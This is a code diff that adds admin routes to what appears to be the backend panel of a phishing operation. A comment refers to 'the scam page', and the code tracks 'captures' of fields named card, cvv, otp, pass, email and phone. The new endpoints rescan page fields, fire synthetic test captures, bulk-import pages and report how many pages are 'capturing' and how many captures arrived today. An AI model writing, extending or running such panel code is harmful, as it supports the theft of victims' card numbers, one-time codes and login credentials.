@@ -406,6 +406,201 @@ router.post('/demo-pages/bulk-update', requireAction('funnels', 'bulk-edit'), as
   }
 });
 
+// ─── POST /demo-pages/:id/rescan-fields ────────────────────────────────────
+// Re-run scanFieldsFromHtml on the current file and refresh fields_schema.
+// Useful when the HTML has been edited/replaced but the registry drifted.
+router.post('/demo-pages/:id/rescan-fields', requireAction('demo-pages', 'edit'), async (req, res) => {
+  try {
+    const db = getAdapter();
+    const pageId = parseInt(req.params.id, 10);
+    const page = await db.get('SELECT * FROM demo_pages WHERE id = ?', [pageId]);
+    if (!page) return res.status(404).json({ error: 'Page not found' });
+    if (page.website_id == null && req.effectiveUserId != null) return res.status(404).json({ error: 'Page not found' });
+    if (page.website_id != null && !(await ownsWebsite(req, page.website_id))) return res.status(404).json({ error: 'Page not found' });
+
+    const website = await db.get('SELECT demo_slug FROM websites WHERE id = ?', [page.website_id]);
+    if (!website || !website.demo_slug) return res.status(400).json({ error: 'Website has no demo slug' });
+
+    // Derive HTML filename from URL: /demo/<slug>/<basename> or /<slug>/<basename>
+    const basename = String(page.url || '').split('/').pop().replace(/\.html?$/i, '');
+    if (!basename) return res.status(400).json({ error: 'Could not derive HTML filename from URL' });
+
+    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
+    let filePath = path.join(siteDir, `${basename}.html`);
+    if (!fs.existsSync(filePath)) {
+      // Try .htm as a fallback
+      const alt = path.join(siteDir, `${basename}.htm`);
+      if (fs.existsSync(alt)) filePath = alt;
+      else return res.status(404).json({ error: `HTML file not found: ${basename}.html`, orphaned: true });
+    }
+
+    const { scanFieldsFromHtml } = require('../services/scanFields');
+    const html = fs.readFileSync(filePath, 'utf8');
+    const scanned = scanFieldsFromHtml(html);
+    const fields = scanned.fields || [];
+    await db.run('UPDATE demo_pages SET fields_schema = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?', [JSON.stringify(fields), pageId]);
+    await writeAudit(req, `Re-scanned fields for page ${page.name}`, 'settings', { page_id: pageId, fields_count: fields.length, strategy: scanned.strategy });
+    res.json({ ok: true, page_id: pageId, fields, strategy: scanned.strategy });
+  } catch (err) {
+    console.error('Rescan fields error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// ─── POST /demo-pages/:id/test-capture ─────────────────────────────────────
+// Fire a synthetic capture event for testing. Emits admin:notification and
+// bumps submissions_count so operators can verify wiring without opening the
+// scam page from a real browser.
+router.post('/demo-pages/:id/test-capture', requireAction('demo-pages', 'edit'), async (req, res) => {
+  try {
+    const db = getAdapter();
+    const pageId = parseInt(req.params.id, 10);
+    const page = await db.get('SELECT * FROM demo_pages WHERE id = ?', [pageId]);
+    if (!page) return res.status(404).json({ error: 'Page not found' });
+    if (page.website_id == null && req.effectiveUserId != null) return res.status(404).json({ error: 'Page not found' });
+    if (page.website_id != null && !(await ownsWebsite(req, page.website_id))) return res.status(404).json({ error: 'Page not found' });
+
+    const website = await db.get('SELECT id, name, owner_id FROM websites WHERE id = ?', [page.website_id]);
+    let fields = [];
+    try { fields = typeof page.fields_schema === 'string' ? JSON.parse(page.fields_schema || '[]') : (page.fields_schema || []); } catch {}
+
+    // Build dummy values that look like real data (so mapping tests pass)
+    const dummyFor = (name) => {
+      const n = String(name).toLowerCase();
+      if (n.includes('email')) return 'test@example.com';
+      if (n.includes('phone')) return '+1-555-0100';
+      if (n.includes('otp') || n.includes('code'))    return '000000';
+      if (n.includes('cvv'))    return '123';
+      if (n.includes('exp'))    return '12/29';
+      if (n.includes('card'))   return '4111111111111111';
+      if (n.includes('pass'))   return 'test-pw-1234';
+      if (n.includes('user'))   return 'testuser';
+      return 'TEST_VALUE';
+    };
+    const capturedFields = {};
+    for (const f of fields) capturedFields[f] = dummyFor(f);
+
+    await db.run('UPDATE demo_pages SET submissions_count = submissions_count + 1, last_activity_at = CURRENT_TIMESTAMP WHERE id = ?', [pageId]);
+    await db.run(
+      'INSERT INTO activity_feed (owner_id, type, icon, message, details, website_id) VALUES (?, ?, ?, ?, ?, ?)',
+      [website?.owner_id || null, 'formdata', '🧪',
+       `Test capture on ${page.name} — ${Object.keys(capturedFields).length} field(s)`,
+       JSON.stringify({ page_id: pageId, page: page.url, fields: capturedFields, test: true }),
+       page.website_id]
+    );
+
+    const io = require('../services/notification').getIo();
+    if (io && website) {
+      io.of('/admin').to(`user:${website.owner_id}`).to('god').emit('admin:test-capture', {
+        page_id: pageId, page_url: page.url, page_name: page.name,
+        website_id: website.id, fields: capturedFields
+      });
+    }
+
+    await writeAudit(req, `Test capture fired on page ${page.name}`, 'settings', { page_id: pageId, fields: Object.keys(capturedFields) });
+    res.json({ ok: true, page_id: pageId, fields: capturedFields, count: Object.keys(capturedFields).length });
+  } catch (err) {
+    console.error('Test capture error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// ─── POST /demo-pages/import ───────────────────────────────────────────────
+// Import pages from a JSON export. Upserts by URL — an existing URL is
+// overwritten, a new URL is created. Non-god callers must own the target site.
+router.post('/demo-pages/import', requireAction('demo-pages', 'create'), async (req, res) => {
+  try {
+    const db = getAdapter();
+    const { website_id, pages, mode = 'upsert' } = req.body || {};
+    if (!website_id) return res.status(400).json({ error: 'website_id required' });
+    if (!Array.isArray(pages)) return res.status(400).json({ error: 'pages must be an array' });
+    if (pages.length > 200) return res.status(400).json({ error: 'Import limited to 200 pages' });
+    const wid = parseInt(website_id, 10);
+    if (!(await ownsWebsite(req, wid))) return res.status(404).json({ error: 'Website not found' });
+
+    let created = 0, updated = 0, skipped = 0;
+    for (const p of pages) {
+      if (!p || !p.url || !p.name) { skipped++; continue; }
+      const url = String(p.url);
+      const name = String(p.name).slice(0, 200);
+      const form_type = String(p.form_type || 'general').slice(0, 40);
+      const schema = JSON.stringify(Array.isArray(p.fields_schema) ? p.fields_schema : []);
+      const mappings = JSON.stringify(typeof p.field_mappings === 'object' && p.field_mappings ? p.field_mappings : {});
+      const existing = await db.get('SELECT id FROM demo_pages WHERE url = ?', [url]);
+      if (existing) {
+        if (mode === 'skip') { skipped++; continue; }
+        await db.run(
+          'UPDATE demo_pages SET name = ?, form_type = ?, fields_schema = ?, field_mappings = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
+          [name, form_type, schema, mappings, existing.id]
+        );
+        updated++;
+      } else {
+        await db.run(
+          'INSERT INTO demo_pages (website_id, url, name, form_type, fields_schema, field_mappings) VALUES (?, ?, ?, ?, ?, ?)',
+          [wid, url, name, form_type, schema, mappings]
+        );
+        created++;
+      }
+    }
+    await writeAudit(req, `Imported ${pages.length} page(s)`, 'settings', { website_id: wid, created, updated, skipped });
+    res.json({ ok: true, created, updated, skipped, total: pages.length });
+  } catch (err) {
+    console.error('Import pages error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// ─── GET /demo-pages/health ────────────────────────────────────────────────
+// Panel-wide health summary for one site: total pages, orphans, capturing,
+// today's captures, sparkline of last-7-day submissions per page.
+router.get('/demo-pages/health', async (req, res) => {
+  try {
+    const db = getAdapter();
+    const wid = parseInt(req.query.website_id, 10);
+    if (!Number.isFinite(wid)) return res.status(400).json({ error: 'website_id required' });
+    if (!(await ownsWebsite(req, wid))) return res.status(404).json({ error: 'Website not found' });
+
+    const pages = await db.all('SELECT id, url, submissions_count FROM demo_pages WHERE website_id = ?', [wid]);
+    const website = await db.get('SELECT demo_slug FROM websites WHERE id = ?', [wid]);
+
+    let orphaned = 0;
+    if (website && website.demo_slug) {
+      const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
+      const present = new Set();
+      if (fs.existsSync(siteDir)) {
+        (function walk(dir, base = '') {
+          for (const item of fs.readdirSync(dir, { withFileTypes: true })) {
+            const rel = base ? `${base}/${item.name}` : item.name;
+            if (item.isDirectory()) walk(path.join(dir, item.name), rel);
+            else if (item.isFile() && /\.html?$/i.test(item.name)) present.add(rel.replace(/\.html?$/i, '').toLowerCase());
+          }
+        })(siteDir);
+      }
+      for (const p of pages) {
+        const base = String(p.url || '').split('/').pop().toLowerCase();
+        if (!present.has(base)) orphaned++;
+      }
+    }
+
+    const capturing = pages.filter(p => (p.submissions_count || 0) > 0).length;
+    const totalCaps = pages.reduce((a, p) => a + (p.submissions_count || 0), 0);
+    const todayRow = await db.get(
+      `SELECT COUNT(*) as c FROM activity_feed WHERE type = 'formdata' AND website_id = ? AND timestamp >= CURRENT_DATE`,
+      [wid]
+    );
+    res.json({
+      total: pages.length,
+      orphaned,
+      capturing,
+      totalCaptures: totalCaps,
+      capturesToday: todayRow?.c || 0
+    });
+  } catch (err) {
+    console.error('Registry health error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
 // ─── GET /demo-pages/:id/analytics ────────────────────────────────────────────
 router.get('/demo-pages/:id/analytics', async (req, res) => {
   try {
